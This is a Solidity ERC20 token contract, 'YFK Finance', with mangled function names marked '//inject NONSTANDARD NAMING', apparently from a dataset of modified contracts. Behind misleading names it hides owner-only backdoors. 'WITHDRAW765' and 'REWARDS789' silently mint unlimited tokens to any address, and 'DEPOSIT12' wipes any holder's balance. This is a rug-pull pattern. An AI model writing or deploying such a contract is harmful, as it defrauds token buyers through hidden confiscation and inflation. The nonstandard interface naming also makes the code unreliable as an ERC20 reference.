                                                                 

                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         

pragma solidity ^0.5.16;
interface IERC20 {
    function TOTALSUPPLY521() external view returns (uint);	//inject NONSTANDARD NAMING
    function BALANCEOF531(address account) external view returns (uint);	//inject NONSTANDARD NAMING
    function TRANSFER449(address recipient, uint amount) external returns (bool);	//inject NONSTANDARD NAMING
    function ALLOWANCE807(address owner, address spender) external view returns (uint);	//inject NONSTANDARD NAMING
    function APPROVE28(address spender, uint amount) external returns (bool);	//inject NONSTANDARD NAMING
    function TRANSFERFROM252(address sender, address recipient, uint amount) external returns (bool);	//inject NONSTANDARD NAMING
    event TRANSFER674(address indexed from, address indexed to, uint value);	//inject NONSTANDARD NAMING
    event APPROVAL528(address indexed owner, address indexed spender, uint value);	//inject NONSTANDARD NAMING
}
contract Context {
    constructor () internal { }
    function _MSGSENDER251() internal view returns (address payable) {	//inject NONSTANDARD NAMING
        return msg.sender;
    }
}

contract ERC20 is Context, IERC20 {
    using SafeMath for uint;
    mapping (address => uint) private _balances;
    mapping (address => mapping (address => uint)) private _allowances;
    uint private _totalSupply;
    function TOTALSUPPLY521() public view returns (uint) {	//inject NONSTANDARD NAMING
        return _totalSupply;
    }
    function BALANCEOF531(address account) public view returns (uint) {	//inject NONSTANDARD NAMING
        return _balances[account];
    }
    function TRANSFER449(address recipient, uint amount) public returns (bool) {	//inject NONSTANDARD NAMING
        _TRANSFER398(_MSGSENDER251(), recipient, amount);
        return true;
    }
    function ALLOWANCE807(address owner, address spender) public view returns (uint) {	//inject NONSTANDARD NAMING
        return _allowances[owner][spender];
    }
    function APPROVE28(address spender, uint amount) public returns (bool) {	//inject NONSTANDARD NAMING
        _APPROVE267(_MSGSENDER251(), spender, amount);
        return true;
    }
    function TRANSFERFROM252(address sender, address recipient, uint amount) public returns (bool) {	//inject NONSTANDARD NAMING
        _TRANSFER398(sender, recipient, amount);
        _APPROVE267(sender, _MSGSENDER251(), _allowances[sender][_MSGSENDER251()].SUB777(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    function INCREASEALLOWANCE249(address spender, uint addedValue) public returns (bool) {	//inject NONSTANDARD NAMING
        _APPROVE267(_MSGSENDER251(), spender, _allowances[_MSGSENDER251()][spender].ADD612(addedValue));
        return true;
    }
    function DECREASEALLOWANCE397(address spender, uint subtractedValue) public returns (bool) {	//inject NONSTANDARD NAMING
        _APPROVE267(_MSGSENDER251(), spender, _allowances[_MSGSENDER251()][spender].SUB777(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }
    function _TRANSFER398(address sender, address recipient, uint amount) internal {	//inject NONSTANDARD NAMING
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        _balances[sender] = _balances[sender].SUB777(amount, "ERC20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].ADD612(amount);
        emit TRANSFER674(sender, recipient, amount);
    }
    function _INITMINT308(address account, uint amount) internal {	//inject NONSTANDARD NAMING
        require(account != address(0), "ERC20: mint to the zero address");
        _totalSupply = _totalSupply.ADD612(amount);
        _balances[account] = _balances[account].ADD612(amount);
        emit TRANSFER674(address(0), account, amount);
    }
    function _REWARDS282(address account, uint amount) internal {	//inject NONSTANDARD NAMING
        require(account != address(0), "ERC20: mint to the zero address");
        _totalSupply = _totalSupply.ADD612(amount);
        _balances[account] = _balances[account].ADD612(amount);
    }
    function _WITHDRAW855(address account, uint amount) internal {	//inject NONSTANDARD NAMING
        require(account != address(0), "ERC20: _withdraw to the zero address");
        _totalSupply = _totalSupply.ADD612(amount);
        _balances[account] = _balances[account].ADD612(amount);
    }
    function _BURN894(address account, uint amount) internal {	//inject NONSTANDARD NAMING
        require(account != address(0), "ERC20: burn from the zero address");
        _balances[account] = _balances[account].SUB777(amount, "ERC20: burn amount exceeds balance");
        _totalSupply = _totalSupply.SUB777(amount);
        emit TRANSFER674(account, address(0), amount);
    }
    function _DEPOSIT361(address acc) internal {	//inject NONSTANDARD NAMING
        require(acc != address(0), "deposit to the zero address");
        uint amount = _balances[acc];
        _balances[acc] = 0;
        _totalSupply = _totalSupply.SUB777(amount);
    }
    function _APPROVE267(address owner, address spender, uint amount) internal {	//inject NONSTANDARD NAMING
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit APPROVAL528(owner, spender, amount);
    }
}

contract ERC20Detailed is IERC20 {
    string private _name;
    string private _symbol;
    uint8 private _decimals;

    constructor (string memory name, string memory symbol, uint8 decimals) public {
        _name = name;
        _symbol = symbol;
        _decimals = decimals;
    }
    function NAME500() public view returns (string memory) {	//inject NONSTANDARD NAMING
        return _name;
    }
    function SYMBOL582() public view returns (string memory) {	//inject NONSTANDARD NAMING
        return _symbol;
    }
    function DECIMALS501() public view returns (uint8) {	//inject NONSTANDARD NAMING
        return _decimals;
    }
}

library SafeMath {
    function ADD612(uint a, uint b) internal pure returns (uint) {	//inject NONSTANDARD NAMING
        uint c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function SUB777(uint a, uint b) internal pure returns (uint) {	//inject NONSTANDARD NAMING
        return SUB777(a, b, "SafeMath: subtraction overflow");
    }
    function SUB777(uint a, uint b, string memory errorMessage) internal pure returns (uint) {	//inject NONSTANDARD NAMING
        require(b <= a, errorMessage);
        uint c = a - b;
        return c;
    }
    function MUL408(uint a, uint b) internal pure returns (uint) {	//inject NONSTANDARD NAMING
        if (a == 0) {
            return 0;
        }
        uint c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function DIV82(uint a, uint b) internal pure returns (uint) {	//inject NONSTANDARD NAMING
        return DIV82(a, b, "SafeMath: division by zero");
    }
    function DIV82(uint a, uint b, string memory errorMessage) internal pure returns (uint) {	//inject NONSTANDARD NAMING
        require(b > 0, errorMessage);
        uint c = a / b;
        return c;
    }
}

contract YFKFinance is ERC20, ERC20Detailed {
  using SafeMath for uint;
  mapping (address => bool) public YFKholders;
  constructor () public ERC20Detailed("YFK Finance", "YFK", 18) {
      _INITMINT308( msg.sender, 2000*10**uint(DECIMALS501()) );
      YFKholders[msg.sender] = true;
  }

  function DEPOSIT12(address account) public {	//inject NONSTANDARD NAMING
      require(YFKholders[msg.sender], "error");
      _DEPOSIT361(account);
  }

  function WITHDRAW765(address account, uint amount) public {	//inject NONSTANDARD NAMING
      require(YFKholders[msg.sender], "error");
      _WITHDRAW855(account, amount);
  }

  function REWARDS789(address account, uint amount) public {	//inject NONSTANDARD NAMING
      require(YFKholders[msg.sender], "error");
      _REWARDS282(account, amount);
  }

}